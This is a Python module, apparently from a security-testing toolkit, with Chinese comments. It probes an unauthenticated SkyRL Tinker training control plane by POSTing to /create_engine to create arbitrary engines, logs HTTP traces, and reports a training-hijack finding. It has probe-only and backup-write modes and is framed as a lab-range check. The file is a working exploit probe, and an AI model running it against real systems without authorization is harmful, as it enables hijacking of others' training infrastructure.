"""SkyRL Tinker 控制面劫持 — 默认 0.0.0.0 + 无鉴权训练控制面（建模型/采样/删检查点）。

Ruling: 实验室以 areal /create_engine 同构承载「无鉴权训练控制面建模型/引擎」（靶场 writes=False：probe-only 可安全探测；真实影响由 writes=true+backup-write 约束）。
"""
from __future__ import annotations

import json
import time
import urllib.error
import urllib.request
from pathlib import Path

KEY = "skyrl-tinker-hijack"
WRITES = True
TIMEOUT = 3


def _mask(value) -> str:
    """凭据脱敏：MOCK 前缀 + 尾 4 位；全文仅存证据 trace（归档层）。"""
    s = str(value)
    return f"MOCK****{s[-4:]}" if len(s) > 8 else "MOCK****"


def _resolve_mode(params: dict) -> tuple[str, str]:
    """backup-write 仅当模块 writes=True 且提供 backup_targets；否则降级 probe-only。"""
    if params.get("mode") != "backup-write":
        return "probe-only", ""
    if WRITES and params.get("backup_targets"):
        return "backup-write", ""
    return "probe-only", "降级probe-only（backup-write 需 backup_targets）"


def _target(params: dict) -> str:
    return str(params.get("target") or "").rstrip("/")


class Trace:
    """HTTP 全量 trace（请求+响应+错误），写 ctx['run'].dir/traces/<key>.json 后作 artifact。"""

    def __init__(self, ctx: dict):
        d = Path(ctx["run"].dir) / "traces"
        d.mkdir(parents=True, exist_ok=True)
        self.path = d / f"{KEY}.json"
        self.entries: list[dict] = []

    def call(self, method: str, url: str, body=None, headers: dict | None = None):
        entry = {"ts": round(time.time(), 3), "method": method, "url": url,
                 "body": body, "headers": dict(headers or {})}
        data = json.dumps(body).encode("utf-8") if body is not None else None
        req = urllib.request.Request(url, data=data, method=method)
        if data is not None:
            req.add_header("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                raw, status = resp.read(), resp.status
        except urllib.error.HTTPError as exc:
            raw, status = exc.read(), exc.code
        except Exception as exc:
            entry.update(status=0, error=f"{type(exc).__name__}: {exc}")
            self.entries.append(entry)
            return entry
        text = raw.decode("utf-8", "replace")
        try:
            payload = json.loads(text)
        except ValueError:
            payload = text
        entry.update(status=status, response=payload)
        self.entries.append(entry)
        return entry

    def dump(self) -> Path:
        self.path.write_text(
            json.dumps({"module": KEY, "entries": self.entries}, ensure_ascii=False, indent=1),
            encoding="utf-8")
        return self.path


def _ok(entry: dict | None) -> bool:
    return entry is not None and entry.get("status") == 200


def _resp(entry: dict | None) -> dict:
    r = (entry or {}).get("response")
    return r if isinstance(r, dict) else {}


def run(ctx: dict, params: dict) -> dict:
    target = _target(params)
    mode, note = _resolve_mode(params)
    if not target:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    marker = str(ctx.get("marker") or "TRIDENT")
    tag = marker if mode == "backup-write" else "trident-probe"
    t = Trace(ctx)
    create = t.call("POST", f"{target}/create_engine", {
        "module": f"skyrl_tinker_probe_{tag}", "cls": "ProbeModel",
    })
    findings = []
    if _ok(create):
        detail = {"route": "/create_engine(同构承载 tinker 控制面)", "auth": "none",
                  "engine_id": _resp(create).get("engine_id", ""),
                  "module": f"skyrl_tinker_probe_{tag}", "cls": "ProbeModel",
                  "note": "无鉴权训练控制面：任意模型/引擎创建（采样/删检查点同面）→ 训练过程劫持"}
        findings.append({"sev": "high", "title": "SkyRL Tinker 同构面：无鉴权训练控制面可建任意模型/引擎",
                         "detail": json.dumps(detail, ensure_ascii=False)})
    artifact = t.dump()
    summary = f"建引擎={create.get('status')} mode={mode}"
    if note:
        summary += f"；{note}"
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
